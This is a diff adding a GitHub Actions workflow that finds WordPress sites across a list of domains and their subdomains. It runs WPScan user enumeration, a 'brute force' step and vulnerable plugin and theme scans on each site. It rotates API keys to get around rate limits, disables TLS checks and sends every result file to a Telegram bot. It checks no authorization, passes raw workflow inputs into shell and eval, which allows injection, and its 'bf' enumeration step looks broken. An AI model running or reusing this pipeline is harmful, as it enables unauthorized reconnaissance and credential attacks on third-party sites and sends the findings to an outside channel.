@@ -1,0 +1,207 @@
+name: WPScan Advanced Enumerator
+
+on:
+  workflow_dispatch:
+    inputs:
+      direct_url:
+        description: 'Direct URL (e.g., target.com or https://target.com)'
+        required: false
+        type: string
+      domains:
+        description: 'Domains to find WP on (e.g., f.com/j.com)'
+        required: false
+        type: string
+
+jobs:
+  wpscan-job:
+    runs-on: ubuntu-latest
+    env:
+      TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+      TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+    
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Install Tools
+        run: |
+          # Install WPScan using the official pre-compiled .deb package
+          wget -q https://github.com/wpscanteam/wpscan/releases/download/v3.8.22/wpscan_3.8.22-1_amd64.deb -O wpscan.deb
+          sudo dpkg -i wpscan.deb 2>/dev/null || sudo apt-get -f install -y > /dev/null 2>&1
+          rm -f wpscan.deb
+          
+          # Install Recon tools
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest > /dev/null 2>&1
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest > /dev/null 2>&1
+          echo "$HOME/go/bin" >> $GITHUB_PATH
+
+      - name: Setup API Keys & Rotation Script
+        run: |
+          # Dynamically build the API key list
+          touch api_keys.txt
+          [ -n "${{ secrets.WPSCAN_API_KEY_1 }}" ] && echo "${{ secrets.WPSCAN_API_KEY_1 }}" >> api_keys.txt
+          [ -n "${{ secrets.WPSCAN_API_KEY_2 }}" ] && echo "${{ secrets.WPSCAN_API_KEY_2 }}" >> api_keys.txt
+          [ -n "${{ secrets.WPSCAN_API_KEY_3 }}" ] && echo "${{ secrets.WPSCAN_API_KEY_3 }}" >> api_keys.txt
+          [ -n "${{ secrets.WPSCAN_API_KEY_4 }}" ] && echo "${{ secrets.WPSCAN_API_KEY_4 }}" >> api_keys.txt
+          [ -n "${{ secrets.WPSCAN_API_KEY_5 }}" ] && echo "${{ secrets.WPSCAN_API_KEY_5 }}" >> api_keys.txt
+          
+          # Create the rotation bash script safely
+          cat << 'EOF' > run_wpscan.sh
+          #!/bin/bash
+          URL="$1"
+          ARGS="$2"
+          OUT_FILE="$3"
+          
+          MAX_RETRIES=5
+          while [ $MAX_RETRIES -gt 0 ]; do
+            API_KEY=$(head -n 1 api_keys.txt 2>/dev/null)
+            CMD="wpscan --url $URL $ARGS --random-user-agent --disable-tls-checks -o $OUT_FILE"
+            
+            if [ -n "$API_KEY" ]; then
+              CMD="$CMD --api-token $API_KEY"
+            fi
+            
+            eval $CMD 2>wpscan_error.log
+            
+            # Check if WPScan hit a rate limit
+            if grep -qi "error.*429\|rate limit\|too many requests" wpscan_error.log; then
+              echo "[!] Rate limit hit on key ending in ...${API_KEY: -4}. Rotating..." >> $OUT_FILE
+              # Remove the burned key from the list
+              sed -i '1d' api_keys.txt
+              touch api_keys.txt
+              
+              if [ ! -s "api_keys.txt" ]; then
+                echo "[!] All API keys exhausted!" >> $OUT_FILE
+                break
+              fi
+            else
+              # Success or other error (not rate limit), break loop
+              break
+            fi
+            MAX_RETRIES=$((MAX_RETRIES - 1))
+          done
+          EOF
+          
+          chmod +x run_wpscan.sh
+          
+          KEY_COUNT=$(wc -l < api_keys.txt | xargs)
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text=🛠️ WPScan Engine Ready. Loaded ${KEY_COUNT} API keys for rotation." || true
+
+      - name: Prepare Targets
+        run: |
+          touch wp_targets.txt
+          
+          # Handle Direct URL input
+          if [ -n "${{ github.event.inputs.direct_url }}" ]; then
+            URL="${{ github.event.inputs.direct_url }}"
+            if [[ ! "$URL" =~ ^https?:// ]]; then
+              URL="https://$URL"
+            fi
+            echo "$URL" >> wp_targets.txt
+          fi
+          
+          # Handle Domains input
+          if [ -n "${{ github.event.inputs.domains }}" ]; then
+            echo "${{ github.event.inputs.domains }}" | tr '/' '\n' | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$' > enum_domains.txt
+            
+            subfinder -l enum_domains.txt -silent | httpx -tech-detect -json -silent | jq -r 'select(.technologies | join(" ") | test("wordpress"; "i")) | .url' >> wp_targets.txt
+          fi
+          
+          sort -u wp_targets.txt -o wp_targets.txt
+          TARGET_COUNT=$(wc -l < wp_targets.txt | xargs)
+          
+          if [ "$TARGET_COUNT" -eq 0 ]; then
+            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+              -d chat_id="${TELEGRAM_CHAT_ID}" \
+              --data-urlencode "text=❌ No WordPress sites found." || true
+            echo "STOP_PIPELINE" > stop.txt
+          else
+            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+              -d chat_id="${TELEGRAM_CHAT_ID}" \
+              --data-urlencode "text=🎯 Found ${TARGET_COUNT} WordPress sites. Starting scan sequence..." || true
+          fi
+
+      - name: Execute WPScan Sequence
+        run: |
+          if [ -f "stop.txt" ]; then exit 0; fi
+          
+          while read -r target; do
+            if [ -z "$target" ]; then continue; fi
+            safe=$(echo "$target" | sed 's/[^a-zA-Z0-9]/_/g' | cut -c 1-30)
+            
+            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+              -d chat_id="${TELEGRAM_CHAT_ID}" \
+              --data-urlencode "text=🚀 Scanning: ${target}" || true
+            
+            # 1. Users
+            ./run_wpscan.sh "$target" "--enumerate u" "${safe}_1_users.txt"
+            if [ -s "${safe}_1_users.txt" ]; then
+              curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
+                -F chat_id="${TELEGRAM_CHAT_ID}" \
+                -F document="@${safe}_1_users.txt" \
+                -F caption="👤 [1/6] Users Found - ${target}" || true
+            fi
+            
+            # 2. Brute Force
+            ./run_wpscan.sh "$target" "--enumerate bf" "${safe}_2_bf.txt"
+            if [ -s "${safe}_2_bf.txt" ]; then
+              curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
+                -F chat_id="${TELEGRAM_CHAT_ID}" \
+                -F document="@${safe}_2_bf.txt" \
+                -F caption="🔐 [2/6] Brute Force Results - ${target}" || true
+            fi
+            
+            # 3. Vulnerable Themes
+            ./run_wpscan.sh "$target" "--enumerate vt" "${safe}_3_vuln_themes.txt"
+            if [ -s "${safe}_3_vuln_themes.txt" ]; then
+              curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
+                -F chat_id="${TELEGRAM_CHAT_ID}" \
+                -F document="@${safe}_3_vuln_themes.txt" \
+                -F caption="🎨 [3/6] VULNERABLE Themes Found! - ${target}" || true
+            fi
+            
+            # 4. Vulnerable Plugins
+            ./run_wpscan.sh "$target" "--enumerate vp" "${safe}_4_vuln_plugins.txt"
+            if [ -s "${safe}_4_vuln_plugins.txt" ]; then
+              curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
+                -F chat_id="${TELEGRAM_CHAT_ID}" \
+                -F document="@${safe}_4_vuln_plugins.txt" \
+                -F caption="🔌 [4/6] VULNERABLE Plugins Found! - ${target}" || true
+            fi
+            
+            # 5. All Themes (Slow)
+            ./run_wpscan.sh "$target" "--enumerate at" "${safe}_5_all_themes.txt"
+            if [ -s "${safe}_5_all_themes.txt" ]; then
+              curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
+                -F chat_id="${TELEGRAM_CHAT_ID}" \
+                -F document="@${safe}_5_all_themes.txt" \
+                -F caption="📖 [5/6] All Themes Enumerated - ${target}" || true
+            fi
+            
+            # 6. All Plugins (Slowest)
+            ./run_wpscan.sh "$target" "--enumerate ap" "${safe}_6_all_plugins.txt"
+            if [ -s "${safe}_6_all_plugins.txt" ]; then
+              curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
+                -F chat_id="${TELEGRAM_CHAT_ID}" \
+                -F document="@${safe}_6_all_plugins.txt" \
+                -F caption="📦 [6/6] All Plugins Enumerated - ${target}" || true
+            fi
+            
+          done < wp_targets.txt
+          
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text=🏁 WPScan Sequence Completely Finished." || true
+
+      - name: Upload Artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: wpscan-results-run-${{ github.run_id }}
+          path: |
+            *.txt
+            *.log
+            *.sh
+          retention-days: 7
